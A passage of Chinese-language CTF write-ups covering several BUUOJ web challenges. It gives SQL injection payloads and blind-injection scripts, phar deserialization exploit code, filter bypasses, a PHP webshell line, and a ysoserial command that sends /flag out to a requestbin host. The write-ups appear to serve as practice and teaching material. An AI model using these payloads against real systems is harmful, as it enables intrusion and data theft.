preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); } } ?> 估计是通过get来进行SSRF攻击了 走一下网站的流程 注册了账号 访问个人界面时 http://111.198.29.45:53095/view.php?no=1 输入no=2 有报错信息，泄露了目录 Notice: Trying to get property of non-object in /var/www/html/view.php on line 53 看一下有没有sql注入，手工注失败了，有waf 看一下sqlmap能不能跑 试了一下有个基于时间盲注的方法...但是最后sqlmap也没给我跑出来 看了一下师傅们的wp,发现是waf把union select给过滤了，用/**/内联注释来绕过 GET /view.php?no=-1%20union/**/select%201,2,3,4 HTTP/1.1 Host: 111.198.29.45:53095 Pragma: no-cache Cache-Control: no-cache DNT: 1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: PHPSESSID=alqac37gsjk5jco5mk288n8ct4 Connection: close HTTP/1.1 200 OK Server: nginx/1.14.2 Date: Wed, 29 Jan 2020 13:45:28 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/5.6.40 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 1666 User Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 username age blog 2 Notice: Trying to get property of non-object in /var/www/html/view.php on line 53 Notice: Trying to get property of non-object in /var/www/html/view.php on line 56 the contents of his/her blog Fatal error: Call to a member function getBlogContents() on boolean in /var/www/html/view.php on line 67 现在可以正常注入了 发现2处可以正常回显 那么有 #爆表 no=-1+union/**/select+1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() #爆列 no=-1+union/**/select+1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() #爆列data的内容 no=-1+union/**/select+1,group_concat(data),3,4 from users data里的内容就是我们之前注册用户的序列化数据 报错信息暗示我们需要构造一个序列化对象 unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 利用前面泄露的源码构造一个恶意对象 利用getBlogContents调用的curl进行SSRF攻击 四个参数都试了一下，发现是第4个用来读用户数据的 payload=?no=-1 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:4:\"test\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}' 在iframe中得到flag 参考资料 绕过限制利用curl读取写入文件: https://www.anquanke.com/post/id/98896 Comment 登进去发现可以发帖，但是要跳转到登陆页 提示用户名密码。。。。。卡了半天 zhangwei zhangwei* burp 爆破下 密码：zhangwei666 然后可以发帖了 此时扫目录还发现了.git GitHacker拿到 但这个显然不是真实的源码。。。。 最后用GitTools恢复了一下 0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\";//category注入到这里 就可以带select $result = mysql_query($sql); } header(\"Location: ./comment.php?id=$bo_id\"); break; default: header(\"Location: ./index.php\"); } } else{ header(\"Location: ./index.php\"); } ?> root@EDI:~/GitTools/Extractor# 利用addslashes进行转义，可以看到存在很明显sql二次注入 poc: title=123&category=',content=(select group_concat(database())),/*&content=1 然后评论*/闭合即可 fuzz了半天，想到可以cat .bash_history.... 用load_file()读文件 读/etc/passwd找用户 select load_file('/home/www/.bash_history') 可以看到 cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start 然后读/tmp/html/.DS_Store呗 但是这里有个坑点是里面会有不可见字符。。 所以先用hex转下码 里面有flag_8946e1ff1ee3e40f.php,load一下拿到flag title=123&category=',content=(select hex(load_file('/tmp/html/flag_8946e1ff1ee3e40f.php'))),/*&content=1 Unfinished 用户名存在二次注入 Poc: username=0'+(select hex(hex(database())))+'0 登录的话会显示database()双hex的效果 一种是利用双hex # coding=utf-8 import requests import re,binascii import sys url = \"http://f4511b17-2c2d-4b8d-9d4f-16e0ed66444b.node3.buuoj.cn/\" sql = \"select * from flag\" email = [\"test0\" + str(i) + \"@aa.aa\" for i in range(0,24)] #这里次数可以通过sql爆破flag长度得到，或者也可fuzz def register(email,offset): payload=\"0'+(select substr(hex(hex(({0}))) from {1} for 10))+'0\".format(sql,str(1+offset*10)) data = { \"email\" : email, \"username\" : payload, \"password\" : \"test\" } req = requests.post(url+\"/register.php\",data = data) def login(email): data = { \"email\" : email, \"password\" : \"test\" } r = requests.post(url+\"/login.php\",data,allow_redirects=True) pattern = '\\s*(\\d{1,10})\\s* %s {} 然后还找到另一种是利用 (select substr((%s)from(%d)for(1))='%s')进行盲注 脚本 #!/usr/bin/env python2 # -*- coding:utf-8 -*- import requests as req import random import sys URL = 'http://f4511b17-2c2d-4b8d-9d4f-16e0ed66444b.node3.buuoj.cn' def login(email): data = { \"email\": email, \"password\": \"123456\" } res = req.post(URL + '/login.php', data) if res.status_code != req.codes.ok : return login(email) if res.status_code == 200 and '1 ' in res.content: return True return False def reg(u, e): data = { \"username\": u, \"email\": e, \"password\": \"123456\" } res = req.post(URL + '/register.php', data, allow_redirects=False) if res.status_code == 302: return login(e) return False table = 'qwertyuiopasdfghjklzxcvbnm' def b(pl): email = ''.join(random.sample(table, 8)) + '@qq.com' return reg(pl, email) def getLen(sql): print(\"[+] Starting getLen...\") for i in range(1, 60): sys.stdout.write(\"[+] Len : -> %d %d %s%c %s © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/wangdingcup-2019.html":{"url":"buuoj/wangdingcup-2019.html","title":"网鼎杯 2019","keywords":"","body":"网鼎杯2019 其他组复现Think JavaSSRFMe 玄武组参考资料Faka参考资料网鼎杯2019 其他组复现 Think Java jdbc:mysql://localhost:3306/数据库名?user=用户名&password=密码&useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT 存在注入点 myapp#' union select database()#; myapp#' union select pwd from user#; myapp#' union select name from user#; myapp?useUnicode=true'union/**/select/**/group_concat(pwd)from(user)# 可以得到用户名admin密码admin@Rrrr_ctf_asde 访问登录路由可以得到 { \"data\":\"Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu\", \"msg\":\"登录成功\", \"status\":2, \"timestamps\":1602227051479 } 下方的特征可以作为序列化的标志参考: 一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。 或者如果以aced开头，那么他就是这一段Java序列化的16进制。 https://www.cnblogs.com/20175211lyz/p/13412945.html 利用Burp Suite的插件Java Deserialization Scanner可以测试到ROME类型的反序列化 生成payload打一打 java -jar ysoserial.jar ROME \"curl http://http.requestbin.buuoj.cn/snc3wasn -d @/flag\" |base64 -w 0 SSRFMe 玄武组 首先是绕过内网IP检测 function check_inner_ip($url) { $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) { die('url fomat error'); } try { $url_parse=parse_url($url); } catch(Exception $e) { die('url fomat error'); return false; } $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16; } 这里的gethostbyname会把hostname转换成ipv4地址 一些绕过的方法 linux下 0.0.0.0 => 127.0.0.1 http://foo@127.0.0.1:80@www.google.com/hint.php DNS Rebinding ip 地址的一些变形 127。0。0。1 127.1 0177.0.0x0001 8进制 16进制等 [::1] >>> 127.0.0.1 [::] >>> 0.0.0.0 NULL php的libcurl 这里比较好用的是0.0.0.0 然后内网访问hint.php可以得到redis的密码 这里利用redis-ssrf工具来进行下一步的渗透 在buuoj vps启动rogue-server 在本机利用ssrf-redis生成对应gopher的payload 执行后可以RCE 参考资料 浅析Redis中SSRF的利用 ：https://xz.aliyun.com/t/5665?accounttraceid=4422b0ffd5f4417194e0e2764df02a04tmev Redis-ssrf : https://github.com/xmsec/redis-ssrf Faka tk.sql 里可以找到后台的管理员账号密码 INSERT INTO `system_user` VALUES (10005,'admin','81c47be5dc6110d5087dd4af8dc56552',NULL,'12345678@qq.com','12345678','demo',264,'2020-03-20 14:38:56',1,'3',0,NULL,'2018-05-02 00:40:09',NULL); 代码审计，已经拿到后台了，看看有无RCE或者文件上传的点 全局搜索upload,可以看到在application/admin/controller/Plugs.php处有 public function upload() { $file = $this->request->file('file');//filename也可控 $ext = strtolower(pathinfo($file->getInfo('name'), 4)); $md5 = str_split($this->request->post('md5'), 16);//注意这里的md5是我们可控的 以十六位一组，进行切片，之后分别将这两组字符串作为路径和文件名，最后在加上之前得到的文件扩展名赋值给$filename $filename = join('/', $md5) . \".{$ext}\"; if (strtolower($ext) == 'php' || !in_array($ext, explode(',', strtolower(sysconf('storage_local_exts'))))) { return json(['code' => 'ERROR', 'msg' => '文件上传类型受限']); }//md5可控，我们可以让生成的文件名后缀为.php绕过此处限制 // 文件上传Token验证 if ($this->request->post('token') !== md5($filename . session_id())) { return json(['code' => 'ERROR', 'msg' => '文件上传验证失败']); } // 文件上传处理 if (($info = $file->move('static' . DS . 'upload' . DS . $md5[0], $md5[1], true))) { if (($site_url = FileService::getFileUrl($filename, 'local'))) { return json(['data' => ['site_url' => $site_url], 'code' => 'SUCCESS', 'msg' => '文件上传成功']); } } return json(['code' => 'ERROR', 'msg' => '文件上传失败']); } 可以看到file()对文件进行了封装，跟踪看到 /** * 获取上传的文件信息 * @access public * @param string|array $name 名称 * @return null|array|\\think\\File */ public function file($name = '') { if (empty($this->file)) { $this->file = isset($_FILES) ? $_FILES : []; } if (is_array($name)) { return $this->file = array_merge($this->file, $name); } $files = $this->file; if (!empty($files)) { // 处理上传文件 $array = []; foreach ($files as $key => $file) { if (is_array($file['name'])) { $item = []; $keys = array_keys($file); $count = count($file['name']); for ($i = 0; $i setUploadInfo($temp); } $array[$key] = $item; } else { if ($file instanceof File) { $array[$key] = $file; } else { if (empty($file['tmp_name']) || !is_file($file['tmp_name'])) { continue; } $array[$key] = (new File($file['tmp_name']))->setUploadInfo($file); } } } if (strpos($name, '.')) { list($name, $sub) = explode('.', $name); } if ('' === $name) { // 获取全部文件 return $array; } elseif (isset($sub) && isset($array[$name][$sub])) { return $array[$name][$sub]; } elseif (isset($array[$name])) { return $array[$name]; } } return; } move函数完成上传 /** * 移动文件 * @access public * @param string $path 保存路径 这里是 'static' . DS . 'upload' . DS . $md5[0] * @param string|bool $savename 保存的文件名 默认自动生成 这里是 $md5[1] * @param boolean $replace 同名文件是否覆盖 * @return false|File */ public function move($path, $savename = true, $replace = true) { // 文件上传失败，捕获错误代码 if (!empty($this->info['error'])) { $this->error($this->info['error']); return false; } // 检测合法性 if (!$this->isValid()) { $this->error = 'upload illegal files'; return false; } // 验证上传 if (!$this->check()) { return false; } $path = rtrim($path, DS) . DS; // 文件保存命名规则 $saveName = $this->buildSaveName($savename); $filename = $path . $saveName; // 检测目录 if (false === $this->checkPath(dirname($filename))) { return false; } // 不覆盖同名文件 if (!$replace && is_file($filename)) { $this->error = ['has the same filename: {:filename}', ['filename' => $filename]]; return false; } /* 移动文件 */ if ($this->isTest) { rename($this->filename, $filename); } elseif (!move_uploaded_file($this->filename, $filename)) { $this->error = 'upload write error'; return false; } // 返回 File 对象实例 $file = new self($filename); $file->setSaveName($saveName)->setUploadInfo($this->info); return $file; } ❯ php -a Interactive mode enabled php > echo md5(\"test\"); 098f6bcd4621d373cade4e832627b4f6 php > $md5 = str_split(\"098f6bcd4621d373cade4e832627b4f6\",16); php > var_dump($md5); array(2) { [0]=> string(16) \"098f6bcd4621d373\" [1]=> string(16) \"cade4e832627b4f6\" } php > $md5[1] = substr($md5[1],0,12).'.php'; php > var_dump($md5); array(2) { [0]=> string(16) \"098f6bcd4621d373\" [1]=> string(20) \"cade4e832627.php\" } php > var_dump(join('/', $md5).\"php\"); string(37) \"098f6bcd4621d373/cade4e832627.php.png\"; php > var_dump(md5(join('/', $md5).\"php\")); string(32) \"1f027bdf029d54fa4e97a14a2180b428\" 令token = 1f027bdf029d54fa4e97a14a2180b428 & md5 =098f6bcd4621d373cade4e832627.php就可以使上传文件后缀为php了 参考资料 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/roarctf-2019.html":{"url":"buuoj/roarctf-2019.html","title":"RoarCTF 2019","keywords":"","body":"[RoarCTF 2019]0x01 Simple Upload0x02 Easy CalcPHPSHE参考资料[RoarCTF 2019] 0x01 Simple Upload 首页给了源码 maxSize = 4096 ;// 设置附件上传大小 $upload->allowExts = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型 $upload->rootPath = './Public/Uploads/';// 设置附件上传目录 $upload->savePath = '';// 设置附件上传子目录 $info = $upload->upload() ; if(!$info) {// 上传错误提示错误信息 $this->error($upload->getError()); return; }else{// 上传成功 获取上传文件信息 $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; echo json_encode(array(\"url\"=>$url,\"success\"=>1)); } } } 根据Thinkphp的URL构造 /index.php/home/index/upload可以上传文件 $upload->upload() ;无参数可以上传任意个数文件而allowExts只能限制第一个的后缀名 然后再利用Upload 'saveName' => array('uniqid', ''),基于时间命名的特性进行爆破shell文件名,getshell,（这里是直接把shell变成flag了....） import requests import base64 url = \"http://70e50a65-e216-4fd2-aa95-a79ba62daaa7.node3.buuoj.cn/index.php/home/index/upload\" files = { \"file\":(\"a.txt\",'a'), \"file1\":(\"b.php\", ' 0x02 Easy Calc 点进去是一个简单的计算器 输入1+1返回2 输入2提示无法计算 看下源代码 $('#calc').submit(function(){ $.ajax({ url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()), type:'GET', success:function(data){ $(\"#result\").html(` 答案:${data} `); }, error:function(){ alert(\"这啥?算不来!\"); } }) return false; }) 调用了calc.php,访问看一下 使用了eval()意味着我们只要能绕过blacklist就能执行任意命令。 测试了一下只能输入运算符和数字，怎么办.... 查阅资料发现只要在num前加个空格就可以绕过waf对num的数字检测了 poc=/calc.php?%20num=phpinfo() Exp: payload=/calc.php?%20num=var_dump(scandir(chr(47))) //\"/\" \"\"被ban,用chr绕过 1array(24) { [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(10) \".dockerenv\" [3]=> string(3) \"bin\" [4]=> string(4) \"boot\" [5]=> string(3) \"dev\" [6]=> string(3) \"etc\" [7]=> string(5) \"f1agg\" [8]=> string(4) \"home\" [9]=> string(3) \"lib\" [10]=> string(5) \"lib64\" [11]=> string(5) \"media\" [12]=> string(3) \"mnt\" [13]=> string(3) \"opt\" [14]=> string(4) \"proc\" [15]=> string(4) \"root\" [16]=> string(3) \"run\" [17]=> string(4) \"sbin\" [18]=> string(3) \"srv\" [19]=> string(8) \"start.sh\" [20]=> string(3) \"sys\" [21]=> string(3) \"tmp\" [22]=> string(3) \"usr\" [23]=> string(3) \"var\" } payload=var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) flag{ec5c334b-a625-4a44-bede-7fb5dd20ef87} int(43) PHPSHE 看是个电商系统 找CVE https://anquan.baidu.com/article/697 复现SQL注入 注入点 include/plugin/payment/alipay/pay.php?id= POC: pay` where 1=1 union select 1,2,user(),4,5,6,7,8,9,10,11,12%23_ 形成注入 select * from `pe_order_pay` where 1=1 union select 1,2,user(),4,5,6,7,8,9,10,11,12 #`_ where 对_使用有限制，无法使用information_schema 使用无列名注入 (select`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1) 得到 admin 2476bf5c8d3653e843b6ed42c0672b91 : altman777 登录后台有上传点 审计源码 ，特别是和原版diff发现 phpstorm64 diff C:\\Users\\Eki\\Desktop\\phpshe1.7 C:\\Users\\Eki\\Desktop\\source 有PCLZIP类，且存在反序列化利用方法 public function __destruct() { $this->extract(PCLZIP_OPT_PATH, $this->save_path); } 可以解压zip到可控目录，那么我们可以上传一个webshell zip 去找有无反序列化利用点 一个是序列化，一个是对文件的操作 猜测模板功能会涉及到相关操作 /admin.php?mod=moban&act=del case 'del': pe_token_match(); $tpl_name = pe_dbhold($_g_tpl); if ($tpl_name == 'default') pe_error('默认模板不能删除...'); if ($db->pe_num('setting', array('setting_key'=>'web_tpl', 'setting_value'=>$tpl_name))) { pe_error('使用中不能删除'); } else { pe_dirdel(\"{$tpl_name}\"); pe_success('删除成功!'); } break; //调用了 //删除文件夹 function pe_dirdel($dir_path) { $dir_path = str_replace(\"..\", \" \", $dir_path); if (is_file($dir_path)) { #unlink($dir_path); } else { $dir_arr = glob(trim($dir_path).'/*'); if (is_array($dir_arr)) { foreach ($dir_arr as $k => $v) { pe_dirdel($v, $type); } } #rmdir($dir_path); } } is_file会触发phar反序列化，那么解法很明显了 上传zip 生成exp zipname = $p_zipname; $this->zip_fd = 0; $this->magic_quotes_status = -1; // ----- Return //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 1); return; } } $o=new PclZip(\"/var/www/html/data/attachment/2020-10/2020101509270216077w.zip\"); $o->save_path='/var/www/html/data'; @unlink(\"test.phar\"); $phar = new Phar(\"test.phar\"); //后缀名必须为phar，生成之后可以修改 $phar->startBuffering(); $phar->setStub(\"GIF89a\".\"\"); //设置stub $phar->setMetadata($o); //将自定义的meta-data存入manifest $phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar->stopBuffering(); ?> 解压上传zip GetShell 这里需要注意要传入参数token和Referer，来通过CSRF的校验 参考资料 https://www.freebuf.com/articles/web/213359.html https://nikoeurus.github.io/2019/10/14/RoarCTF © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/0ctf-2016.html":{"url":"buuoj/0ctf-2016.html","title":"0CTF 2019","keywords":"","body":"0CTF 20160x01 0CTF 2016 PiaPiaPia参考资料0CTF 2016 0x01 0CTF 2016 PiaPiaPia 进入是一个登入界面，试了几个万能密码都没有用，也没有报错之类的 扫描网站目录有/www.zip源码泄露 找了一下config里有flag但是是空的,看来是要想办法读/config.php了 有注册页，看下注册逻辑，跟进在class.php里 public function register($username, $password) { $username = parent::filter($username); $password = parent::filter($password); $key_list = Array('username', 'password'); $value_list = Array($username, md5($password)); return parent::insert($this->table, $key_list, $value_list); } 这里有个filter public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); } 过滤了单引号，双斜杠，'select', 'insert', 'update', 'delete', 'where' 先试着注册一个账号，提示要填写profile，看下这部分逻辑 if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) { $username = $_SESSION['username']; if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user->update_profile($username, serialize($profile)); echo 'Update Profile Success!Your Profile'; } 看到一个serialize()，看一下有没有反序列化 注意到 $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo'])); 应该就是想办法利用$profile['photo']读出config.php了 直接在photo里搞肯定是不行的，注意到nickname是可控的 if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10) die('Invalid nickname'); preg_match和strlen可以利用数组形式绕过 这里利用的是php反序列化长度变化尾部字符串逃逸 对于unserialize()而言，这个函数会忽略能够正常序列化的字符串后面的字符串 我们的目的是构造 s:5:\"photo\";s:10:\"config.php\";} 但是生成的序列化对象会检验长度，怎么办呢 注意到 $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); where->hacker 5->6 每写一个where多一个字符， 这里我们多构造的是\"};s:5:\"photo\";s:10:\"config.php\";} 一共34个字符因为nickname是数组所以前要补} nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";} $profile = a:4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:8:\"ss@q.com\";s:8:\"nickname\";a:1:{i:0;s:204:\"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\"};s:5:\"photo\";s:10:\"config.php\";}s:39:\"upload/804f743824c0451b2f60d81b63b6a900\";} 参考资料 php利用数组绕过的总结： https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/gxyctf-2019.html":{"url":"buuoj/gxyctf-2019.html","title":"GXYCTF 2019","keywords":"","body":"GXYCTF 20190x01 [GXYCTF2019]Ping Ping Ping0x02 [GXYCTF2019]禁止套娃0x03 [GXYCTF2019]BabysqliV3.00x04 [GXYCTF2019]BabyUpload参考资料0x04 Strongest MindGXYCTF 2019 0x01 [GXYCTF2019]Ping Ping Ping 命令执行变量拼接 /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php 过滤bash用sh执行 echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 内联执行 将反引号内命令的输出作为输入执行 ?ip=127.0.0.1;cat$IFS$9`ls` 绕过空格的方法大概有以下几种： $IFS ${IFS} $IFS$1 //$1改成$加其他数字貌似都行 {cat,flag.php} //用逗号实现了空格功能 %20 %09 ps:有时会禁用cat: 解决方法是使用tac反向输出命令： linux命令中可以加\\，所以甚至可以ca\\t /fl\\ag 我们看到源码中有一个$a变量可以覆盖 /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php 过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行。 echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 内联执行的做法(内联，就是将反引号内命令的输出作为输入执行)： ?ip=127.0.0.1;cat$IFS$9`ls` 输出目录所有文件 0x02 [GXYCTF2019]禁止套娃 试了几个目录发现不会404，就没想着去扫目录了，结果漏了/.git....能拿到index.php \"; if(isset($_GET['exp'])){ if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) { if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die(\"还差一点哦！\"); } } else{ die(\"再好好想想！\"); } } else{ die(\"还想读flag，臭弟弟！\"); } } // highlight_file(__FILE__); ?> 给了参数exp,三次过滤第一次过滤了各种协议，第二个把括号呢参数给过滤了 第三个过滤了一些把字符串改成数字的函数操作 这里考虑无参数RCE 测试输出 print_r() vardump() 扫描当前目录 current(localeconv()) => . pos(localeconv()) => . payload=print_r(scandir(pos(localeconv()))); 或者也可以 phpversion() 回显 string(11) \"7.3.10-1+b1\" floor(phpversion()) 回显 float(7) sqrt(floor(phpversion())) 回显 float(2.6457513110646) tan(floor(sqrt(floor(phpversion())))) 回显 float(-2.1850398632615) cosh(tan(floor(sqrt(floor(phpversion()))))) 返回4.5017381103491 sinh(cosh(tan(floor(sqrt(floor(phpversion())))))) 返回45.081318677156 ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))) 回显 46 chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) 回显 string(1) \".\" next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))) 回显 string(2) \"..\" 可以看到 flag.php 是倒数第二个值，假设是倒数第一个我们可以用end()，但是并没有一个操作数组的函数能够输出数组的倒数第二个值。这里用嵌套函数实现 array_reverse()+next() next(array_reverse(scandir(pos(localeconv())))) array_rand()+array_flip() 随机读+键和值互换 var_dump(array_rand(array_flip(scandir(current(localeconv()))))); 读文件 因为et被ban了，所以不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source() 第二种方法是利用PHPSESSION PHPSESSION=flag.php session_id(session_start()) => flag.php 通过飘零师傅的文章可以知道，题目虽然ban了 hex 关键字，导致 hex2bin() 被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为 flag.php 这些字符是 PHPSESSID 本身就支持的。 使用 session之前需要通过 session_start() 告诉PHP使用session，php默认是不主动使用session的。 session_id() 可以获取到当前的session id。 因此我们手动设置名为 PHPSESSID 的cookie，并设置值为 flag.php 0x03 [GXYCTF2019]BabysqliV3.0 登陆界面弱密码爆破 admin password 进入后台可以上传文件 根据url试了一下有没有LFI http://bb0e8107-18e7-4a15-9b48-c7c4c72cfa73.node3.buuoj.cn/home.php?file=php://filter/convert.base64-encode/resource=upload 可以拿到Upload.php和home.php的源码 找危险函数 class Uploader{ public $Filename; public $cmd; public $token; ... function __destruct(){ if($this->token != $_SESSION['user']){ $this->cmd = \"die('check token falied!');\"; } eval($this->cmd); } ... } if(isset($_FILES['file'])) { $uploader = new Uploader(); $uploader->upload($_FILES[\"file\"]); if(@file_get_contents($uploader)){ echo \"下面是你上传的文件：\".$uploader.\"\"; echo file_get_contents($uploader); } } 本来想直接上传flag.php利用file_get_contents($uploader);攻击的，但是这里好像读不出来，可能是因为路径问题。。 这里考察的是phar反序列化攻击 构造的对象 Filename=\"test\"; $o->cmd=\"highlight_file('/var/www/html/flag.php');\"; $o->token=\"GXY8576f1181ce29baf95cd9285c214d84d\";//上传一个文件来获得 生成phar Filename=\"test\"; $o->cmd=\"highlight_file('/var/www/html/flag.php');\"; $o->token=\"GXY8576f1181ce29baf95cd9285c214d84d\"; $phar = new Phar(\"exp.phar\"); $phar->startBuffering(); $phar->setStub('GIF89a'.''); $phar->addFromString('test.txt','test'); //添加要压缩的文件 $phar->setMetadata($o); //将自定义 meta-data 存入 manifest $phar->stopBuffering(); ?> if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){ $this->Filename = $_GET['name']; } 上传后利用name传参,phar://协议读取 然后再随便上传一个文件就可以看到了 0x04 [GXYCTF2019]BabyUpload 上传题， 试了半天只能传Content-Type: image/jpeg.... ph后缀被过滤，目录下没有现成的index.php 考虑上传.htaccess AddType application/x-httpd-php .jpg 再传个马上去即可 @eval($_REQUSET['eki']); 参考资料 有趣的.htaccess : https://skysec.top/2017/09/06/%E6%9C%89%E8%B6%A3%E7%9A%84-htaccess/ 0x04 Strongest Mind 写脚本自动提交答案 #coding=utf-8 import requests import re import time url=\"http://7e06e031-f0c4-460e-a008-c160f5dcc242.node3.buuoj.cn/\" rule=re.compile(r\"\\d* [-+*/] \\d*\") s=requests.Session() req=s.get(url=url) for i in range(1000): text=rule.findall(req.text)[0] data={ \"answer\":str(eval(text)), } #print data req=s.post(url=url,data=data) time.sleep(0.5) while(req.status_code!=requests.codes.ok): req=s.post(url=url,data=data) time.sleep(0.5) print req.text print req.text © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/hitcon-2017.html":{"url":"buuoj/hitcon-2017.html","title":"Hitcon 2017","keywords":"","body":"[HITCON 2017]0x01 SSRFme[HITCON 2017] 0x01 SSRFme 首页给了代码 大致就是调用GET命令读URL并保存文件，然而escapeshellarg并不知道怎么逃逸 这个GET命令没见过 查了一下发现是perl写的 有个经典漏洞 php中shell_exec执行GET命令，而GET命令是通过perl执行的 perl在open当中可以执行命令，如: open(FD, “ls|”)或open(FD, “|ls”) 前提是文件需要存在 root@kali:~/test# GET 'file:id|' uid=0(root) gid=0(root) groups=0(root) 但是好像因为版本更新了？本地没复现 然后就有了payload /?url=file:bash -c /readflag|&filename=bash -c /readflag| 访问两次再访问对应生成的文件就能拿到flag. © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right 